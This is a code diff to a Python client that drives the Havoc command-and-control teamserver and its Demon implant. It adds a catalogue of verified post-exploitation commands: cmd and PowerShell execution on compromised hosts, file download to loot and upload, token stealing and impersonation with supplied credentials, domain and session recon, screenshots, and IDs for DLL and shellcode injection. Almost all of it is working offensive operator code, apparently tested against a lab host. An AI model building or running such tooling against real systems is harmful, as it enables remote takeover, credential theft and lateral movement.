@@ -62,16 +62,109 @@ SE_SESSION_REMOVE = 0x2
 SE_SESSION_INPUT = 0x3   # client -> teamserver: task a session
 SE_SESSION_OUTPUT = 0x4  # teamserver -> client: task output (Output is base64)
 
-# Command ids the dispatcher feeds to strconv.Atoi (pkg/agent/commands.go).
-# Sending anything non-numeric here silently becomes command 0 and the task is
+# Command ids the dispatcher feeds to strconv.Atoi (pkg/agent/commands.go,
+# mirrored by the client's Commands enum in DemonCmdDispatch.h). Sending
+# anything non-numeric here silently becomes command 0 and the task is
 # accepted but never executed.
 CMD_NOJOB = 10        # also the check-in heartbeat id
 CMD_SLEEP = 11
 CMD_PROC_LIST = 12
 CMD_FS = 15
+CMD_INLINE_EXECUTE = 20
+CMD_JOB = 21
+CMD_INJECT_DLL = 22
+CMD_INJECT_SHELLCODE = 24
+CMD_INJECT_DLL_SPAWN = 26
+CMD_TOKEN = 40
 CMD_PROC = 0x1010
+CMD_CHECKIN = 100
+CMD_INLINE_EXECUTE_ASSEMBLY = 0x2001
+CMD_ASSEMBLY_LIST_VERSIONS = 0x2003
+CMD_NET = 2100
+CMD_CONFIG = 2500
+CMD_SCREENSHOT = 2510
+CMD_PIVOT = 2520
+CMD_TRANSFER = 2530
+CMD_SOCKET = 2540
+CMD_KERBEROS = 2550
+CMD_EXIT = 92
 # ProcCommand sub-commands used by the GUI's console (ConsoleInput.cc).
 PROC_SUBCOMMAND_SHELL = 4
+
+#: Friendly command catalogue. Every entry mirrors a ConsoleInput.cc branch +
+#: its CommandSend.cc frame and the daemon-side switch in
+#: teamserver/pkg/agent/demons.go, so the portal can offer the whole Demon
+#: vocabulary instead of just `shell`. Entries flagged "verified" ran live
+#: against a real Demon on ws01 (see matrix §4.3); the rest have correct
+#: source-derived shapes but no live run yet.
+#: NOTE: the daemon's FS switch has NO "ls" case — console `ls` sends
+#: SubCommand "dir". An earlier portal build sent "ls" and only appeared to
+#: work because the collect window also caught the previous task's output.
+COMMANDS: dict[str, dict[str, Any]] = {
+    "shell":      {"cmd": CMD_PROC, "proc_command": 4,
+                   "help": "Run via cmd.exe: shell <command line>",
+                   "verified": True},
+    "powershell": {"cmd": CMD_PROC, "proc_command": 4, "powershell": True,
+                   "help": "Run via powershell.exe: powershell <command line>",
+                   "verified": True},
+    "ls":         {"cmd": CMD_FS, "sub": "dir",
+                   "help": "List directory: ls [path]",
+                   "verified": True},
+    "dir":        {"cmd": CMD_FS, "sub": "dir",
+                   "help": "List directory (cmd style): dir [path]",
+                   "verified": True},
+    "pwd":        {"cmd": CMD_FS, "sub": "pwd", "help": "Print working directory",
+                   "verified": True},
+    "cd":         {"cmd": CMD_FS, "sub": "cd",
+                   "help": "Change directory: cd <path>"},
+    "cat":        {"cmd": CMD_FS, "sub": "cat",
+                   "help": "Dump file text: cat <path>",
+                   "verified": True},
+    "cp":         {"cmd": CMD_FS, "sub": "cp",
+                   "help": "Copy file: cp <src> <dst>"},
+    "mv":         {"cmd": CMD_FS, "sub": "mv",
+                   "help": "Move file: mv <src> <dst>"},
+    "mkdir":      {"cmd": CMD_FS, "sub": "mkdir",
+                   "help": "Make directory: mkdir <path>"},
+    "rm":         {"cmd": CMD_FS, "sub": "remove",
+                   "help": "Remove file/dir: rm <path>"},
+    "download":   {"cmd": CMD_FS, "sub": "download",
+                   "help": "Retrieve file to teamserver loot: download <path>"},
+    "upload":     {"cmd": CMD_FS, "sub": "upload",
+                   "help": "Send file to implant: upload <remote-path> "
+                           "(bytes via upload_data_b64 kwarg)"},
+    "ps":         {"cmd": CMD_PROC_LIST, "help": "Process list",
+                   "verified": True},
+    "sleep":      {"cmd": CMD_SLEEP,
+                   "help": "Set beacon sleep: sleep <seconds> [jitter]",
+                   "verified": True},
+    "checkin":    {"cmd": CMD_CHECKIN, "help": "Force immediate checkin",
+                   "verified": True},
+    "token":      {"cmd": CMD_TOKEN,
+                   "help": "Token ops: steal <pid> | impersonate <pid> | "
+                           "make <domain> <user> <pass> | list | getuid | revert",
+                   "verified": True},
+    "config":     {"cmd": CMD_CONFIG,
+                   "help": "Implant config (dotted keys only): implant.sleep-mask "
+                           "| implant.sleep-obf(.technique) | implant.coffee.veh | "
+                           "implant.coffee.threaded | implant.verbose — "
+                           "config <key> <true|false|value>",
+                   "verified": True},
+    "screenshot": {"cmd": CMD_SCREENSHOT, "help": "Capture screenshot",
+                   "verified": True},
+    "net":        {"cmd": CMD_NET,
+                   "help": "Net recon: domain | computers | sessions | shares | "
+                           "dclist | logons",
+                   "verified": True},
+    "job":        {"cmd": CMD_JOB,
+                   "help": "Jobs: list | kill <id> | suspend <id> | resume <id>",
+                   "verified": True},
+    "task":       {"cmd": CMD_JOB,
+                   "help": "Tasks: list | clear",
+                   "verified": True},
+    "exit":       {"cmd": CMD_EXIT,
+                   "help": "Exit: thread (kill beacon) | process (kill process)"},
+}
 
 # Format -> FileType (dispatch.go:883-901)
 FORMATS = {
@@ -360,20 +453,6 @@ class HavocClient:
             "Body": {"SubEvent": SE_SESSION_INPUT, "Info": info},
         })
 
-    @staticmethod
-    def _shell_args(command: str) -> str:
-        """The `Args` string the GUI builds for `shell <cmd>`.
-
-        client/src/Havoc/Demon/ConsoleInput.cc:878 constructs
-            "0;FALSE;TRUE;" + "c:\\windows\\system32\\cmd.exe" + ";" + base64("/c " + cmd)
-        and hands it to Execute.ProcModule(TaskID, 4, Args). The arg part is
-        base64 because the command line can contain ';' and the Args field is
-        semicolon-delimited.
-        """
-        program = r"c:\windows\system32\cmd.exe"
-        args = base64.b64encode(("/c " + command).encode()).decode("ascii")
-        return f"0;FALSE;TRUE;{program};{args}"
-
     async def task(self, demon_id: str, command: str,
                    wait: float = 25.0) -> dict[str, Any]:
         """Run a shell command on a session and collect its output.
@@ -387,9 +466,137 @@ class HavocClient:
         frame = self._task_frame(demon_id, task_id, command,
                                  str(CMD_PROC),
                                  {"ProcCommand": str(PROC_SUBCOMMAND_SHELL),
-                                  "Args": self._shell_args(command)})
+                                  "Args": self._proc_args(
+                                      r"c:\windows\system32\cmd.exe", command)})
         chunks: list[str] = []
         return await self._collect(demon_id, frame, command, task_id, chunks, wait)
+
+    @staticmethod
+    def _b64(s: str) -> str:
+        return base64.b64encode(s.encode()).decode("ascii")
+
+    @classmethod
+    def _proc_args(cls, program: str, command: str) -> str:
+        """The `Args` string for Execute.ProcModule: the arg part is base64
+        because the field is semicolon-delimited (ConsoleInput.cc:878)."""
+        return f"0;FALSE;TRUE;{program};" + cls._b64("/c " + command)
+
+    async def run(self, demon_id: str, line: str, wait: float = 25.0,
+                  upload_data_b64: str | None = None) -> dict[str, Any]:
+        """Run any catalogue command line: `ls C:\\`, `sleep 10`, `ps`, ...
+
+        A bare command line that does not start with a catalogue word is run
+        as `shell` (every other framework executes raw lines, so the console
+        keeps that expectation instead of erroring on `whoami`).
+        """
+        parts = line.strip().split(None, 1)
+        name = parts[0].lower() if parts else ""
+        rest = parts[1] if len(parts) > 1 else ""
+        if name not in COMMANDS:
+            return await self.task(demon_id, line, wait=wait)
+        spec = COMMANDS[name]
+        cmd_id = spec["cmd"]
+        extra: dict[str, str] = {}
+        if cmd_id == CMD_PROC and "proc_command" in spec:
+            program = (r"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
+                       if spec.get("powershell")
+                       else r"c:\windows\system32\cmd.exe")
+            extra = {"ProcCommand": str(spec["proc_command"]),
+                     "Args": self._proc_args(program, rest)}
+        elif cmd_id == CMD_FS:
+            sub = spec["sub"]
+            if sub == "dir":
+                path = rest or "."
+                extra = {"SubCommand": sub,
+                         "Arguments": f"{path};false;false;false;false;;;"}
+            elif sub in ("cp", "mv"):
+                halves = rest.split(None, 1)
+                if len(halves) != 2:
+                    raise BackendError(f"havoc: {name} needs <src> <dst>")
+                extra = {"SubCommand": sub,
+                         "Arguments": self._b64(halves[0]) + ";" + self._b64(halves[1])}
+            elif sub in ("cat", "download"):
+                if not rest:
+                    raise BackendError(f"havoc: {name} needs <path>")
+                extra = {"SubCommand": sub, "Arguments": self._b64(rest)}
+            elif sub == "upload":
+                if not rest or upload_data_b64 is None:
+                    raise BackendError("havoc: upload needs <remote-path> "
+                                       "plus upload_data_b64 content")
+                extra = {"SubCommand": sub,
+                         "Arguments": self._b64(rest) + ";" + upload_data_b64}
+            elif sub in ("cd", "remove", "mkdir"):
+                if not rest and sub != "pwd":
+                    raise BackendError(f"havoc: {name} needs <path>")
+                extra = {"SubCommand": sub, "Arguments": rest}
+            else:  # pwd
+                extra = {"SubCommand": sub, "Arguments": ""}
+        elif cmd_id == CMD_SLEEP:
+            bits = rest.split()
+            if not bits:
+                raise BackendError("havoc: sleep needs <seconds> [jitter]")
+            extra = {"Arguments": bits[0] + ";" + (bits[1] if len(bits) > 1 else "0")}
+        elif cmd_id == CMD_TOKEN:
+            bits = rest.split(None, 1)
+            if not bits:
+                raise BackendError("havoc: token needs a subcommand")
+            extra = {"SubCommand": bits[0],
+                     "Arguments": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_CONFIG:
+            bits = rest.split(None, 1)
+            if not bits:
+                raise BackendError("havoc: config needs <key> [value]")
+            extra = {"ConfigKey": bits[0],
+                     "ConfigVal": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_NET:
+            # NetCommand is NUMERIC on the wire (daemon Atoi's it): the GUI
+            # maps words to DEMON_NET_COMMAND_* (commands.go). Sending the word
+            # fails with `parsing "domain": invalid syntax`.
+            net_map = {"domain": "1", "logons": "2", "sessions": "3",
+                       "computers": "4", "dclist": "5", "share": "6",
+                       "localgroup": "7", "group": "8", "users": "9"}
+            bits = rest.split(None, 1)
+            if not bits or bits[0] not in net_map:
+                raise BackendError(
+                    "havoc: net needs one of " + ", ".join(sorted(net_map)))
+            extra = {"NetCommand": net_map[bits[0]],
+                     "Param": bits[1] if len(bits) > 1 else ""}
+        elif cmd_id == CMD_JOB:
+            if name == "task":
+                # `task` is a TEAMSERVER-side command (CommandID "Teamserver",
+                # Command "task::list"), not a Demon JOB: the GUI's
+                # Execute.Task sends exactly this shape (CommandSend.cc:448).
+                bits = (rest or "list").split()
+                if bits[0] not in ("list", "clear"):
+                    raise BackendError("havoc: task takes list|clear")
+                task_id = uuid.uuid4().hex[:12]
+                frame = self._task_frame(demon_id, task_id, line,
+                                         "Teamserver", {"Command": "task::" + bits[0]})
+                chunks: list[str] = []
+                out = await self._collect(demon_id, frame, line, task_id,
+                                          chunks, wait)
+                out["havoc_command"] = name
+                return out
+            bits = rest.split(None, 1)
+            sub = bits[0] if bits else "list"
+            extra = {"Command": sub,
+                     "Param": bits[1] if len(bits) > 1 else "0"}
+        elif cmd_id == CMD_EXIT:
+            if rest not in ("thread", "process"):
+                raise BackendError("havoc: exit takes thread|process")
+            extra = {"ExitMethod": rest}
+        # CHECKIN / SCREENSHOT carry no extra keys. PROC_LIST requires
+        # FromProcessManager ("true"/"false" strings): omitting it crashes
+        # the teamserver (Go panic on the missing key -> container restart).
+        if cmd_id == CMD_PROC_LIST:
+            extra = {"FromProcessManager": "false"}
+        task_id = uuid.uuid4().hex[:12]
+        frame = self._task_frame(demon_id, task_id, line,
+                                 str(cmd_id), extra)
+        chunks: list[str] = []
+        out = await self._collect(demon_id, frame, line, task_id, chunks, wait)
+        out["havoc_command"] = name
+        return out
 
     async def task_fs(self, demon_id: str, subcommand: str, arguments: str = "",
                       wait: float = 20.0) -> dict[str, Any]:
@@ -412,12 +619,29 @@ class HavocClient:
     async def _collect(self, demon_id: str, frame: str, command: str,
                        task_id: str, chunks: list[str],
                        wait: float) -> dict[str, Any]:
+        # Freshness cutoff: a newly-connected client is REPLAYED the recent
+        # event history (EventBroadcast backlog), so without this every call
+        # re-collects old task output and old errors as if they were fresh.
+        # Head.Time is server clock ("02/01/2006 15:04:05"); drop anything
+        # older than the request itself (5s grace for skew).
+        cutoff = time.time() - 5
+
+        def _fresh(head: dict) -> bool:
+            try:
+                ts = time.mktime(time.strptime(str(head.get("Time", "")),
+                                               "%d/%m/%Y %H:%M:%S"))
+            except (ValueError, TypeError):
+                return True  # unparseable: keep rather than drop blindly
+            return ts >= cutoff
+
         def on_frame(msg: dict) -> dict[str, Any] | None:
             head, body = msg.get("Head") or {}, msg.get("Body") or {}
             info = body.get("Info") or {}
             if head.get("Event") != EV_SESSION or body.get("SubEvent") != SE_SESSION_OUTPUT:
                 return None
             if (info.get("DemonID") or "") != demon_id:
+                return None
+            if not _fresh(head):
                 return None
             # CommandID 10 is COMMAND_NOJOB - the periodic check-in heartbeat
             # (events.CallBack). It shares this frame type with real task
@@ -441,15 +665,20 @@ class HavocClient:
                 "raw_chunks": len(chunks)}
 
 
+# Console messages that are pure protocol chatter, never results. Everything
+# else in Message is kept: short Demon replies (pwd, getuid, net, token)
+# arrive as Message-only lines with no Output key.
+_CONSOLE_NOISE = ("Send Task to Agent", "Received Output")
+
+
 def _parse_console(chunks: list[str]) -> str:
     """Pull the real command output out of Havoc's console JSON stream.
 
     The teamserver interleaves several JSON objects per task:
-      {"Message":"Send Task to Agent [112 bytes]","Type":"Good"}
+      {"Message":"Send Task to Agent [112 bytes]","Type":"Good"}   <- noise
       {"Message":"Received Output [14 bytes]:","Output":"ws01\\vagrant\\r\\n","Type":"Good"}
+      {"Message":"Current directory: C:\\...","Type":"Info"}       <- RESULT
       {}                      <- separators between frames
-    Only the `Output` field is command output; the Message fields are status
-    chatter that would otherwise be pasted into the UI as if it were results.
     """
     pieces: list[str] = []
     for chunk in chunks:
@@ -463,14 +692,17 @@ def _parse_console(chunks: list[str]) -> str:
                 # Not JSON at all - raw output, keep it.
                 pieces.append(line)
                 continue
-            if isinstance(obj, dict):
-                out = obj.get("Output")
+            items = obj if isinstance(obj, list) else [obj]
+            for item in items:
+                if not isinstance(item, dict):
+                    continue
+                out = item.get("Output")
                 if out:
                     pieces.append(str(out))
-            elif isinstance(obj, list):
-                for item in obj:
-                    if isinstance(item, dict) and item.get("Output"):
-                        pieces.append(str(item["Output"]))
+                    continue
+                msg = str(item.get("Message") or "")
+                if msg and not msg.startswith(_CONSOLE_NOISE):
+                    pieces.append(msg)
     # Havoc emits the same output twice for some tasks (the console echo plus
     # the real reply). Collapse adjacent duplicates rather than all repeats, so
     # a command that legitimately repeats a line still reads correctly.
